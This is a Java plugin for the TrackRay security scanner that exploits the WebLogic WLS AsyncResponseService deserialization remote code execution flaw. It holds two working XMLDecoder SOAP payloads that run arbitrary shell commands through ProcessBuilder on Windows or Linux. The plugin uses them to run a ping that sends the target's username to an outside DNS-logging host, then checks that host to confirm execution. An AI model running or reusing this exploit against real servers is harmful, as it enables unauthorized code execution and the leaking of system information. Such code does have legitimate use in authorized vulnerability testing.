package com.trackray.module.plugin.server.weblogic;

import com.trackray.base.annotation.Param;
import com.trackray.base.annotation.Plugin;
import com.trackray.base.annotation.Rule;
import com.trackray.base.plugin.CommonPlugin;
import com.trackray.module.inner.FuckCeye;
import net.sf.json.JSONArray;
import net.sf.json.JSONObject;
import org.javaweb.core.net.HttpResponse;
import org.springframework.beans.factory.annotation.Autowired;

import java.net.MalformedURLException;
import java.util.Map;
import java.util.UUID;

import static com.trackray.module.poc.WebLogicWLSRCE.pages;

/**
 * @author 浅蓝
 * @email blue@ixsec.org
 * @since 2019/5/10 16:10
 */
@Plugin(title = "WebLogic WLS 反序列化代码执行" ,author = "浅蓝" )
@Rule(params = {
        @Param(key = "target" ,desc= "目标网址")
},type = CommonPlugin.Type.JSON)
public class WeblogicAsyncResponseServiceRCE extends CommonPlugin<String> {
    @Autowired
    private FuckCeye fuckCeye;

    public static String[] rcePayloads = {
            "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:wsa=\"http://www.w3.org/2005/08/addressing\" xmlns:asy=\"http://www.bea.com/async/AsyncResponseService\"><soapenv:Header><wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"><java version=\"1.8.0_131\" class=\"java.beans.xmlDecoder\"><void class=\"java.lang.ProcessBuilder\"><array class=\"java.lang.String\" length=\"3\"><void index=\"0\"><string>cmd</string></void><void index=\"1\"><string>/c</string></void><void index=\"2\"><string>%s</string></void></array><void method=\"start\"/></void></java></work:WorkContext></soapenv:Header><soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>"
            ,
            "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:wsa=\"http://www.w3.org/2005/08/addressing\" xmlns:asy=\"http://www.bea.com/async/AsyncResponseService\"><soapenv:Header><wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"><java version=\"1.8.0_131\" class=\"java.beans.xmlDecoder\"><void class=\"java.lang.ProcessBuilder\"><array class=\"java.lang.String\" length=\"3\"><void index=\"0\"><string>/bin/bash</string></void><void index=\"1\"><string>-c</string></void><void index=\"2\"><string>%s</string></void></array><void method=\"start\"/></void></java></work:WorkContext></soapenv:Header><soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>"
    };
    private String url;
    @Override
    public boolean check(Map<String, Object> param) {
        for (String page : pages) {
            try {
                String pageurl = param.get(this.currentRule().params()[0].key()).toString().concat(page);
                HttpResponse resp = requests.url(pageurl).get();
                if (resp.getStatusCode() == 200){
                    url = pageurl;
                    return true && FuckCeye.canUse;
                }
            } catch (MalformedURLException e) {
                continue;
            }
        }
        return false;
    }

    @Override
    public String start() {
        String uuid = UUID.randomUUID().toString().substring(0, 8);
        JSONArray arr = new JSONArray();
        for (String payload : rcePayloads) {
            if (payload.contains("bin/bash"))
                payload = String.format(payload,"ping `whoami`."+uuid+"."+fuckCeye.identifier);
            else
                payload = String.format(payload,"ping %USERNAME%."+uuid+"."+fuckCeye.identifier);
            try {
                HttpResponse post = requests.url(url).contentType("text/xml").data(payload).post();
                Thread.sleep(2000);
                JSONObject json = fuckCeye.searchDNS(uuid);
                if (post.getStatusCode()!=404 ){
                    arr.add(json);
                    if (!json.getJSONArray("data").isEmpty())
                        break;
                }
            } catch (Exception e) {
                continue;
            }
        }


        return arr.toString();
    }
}
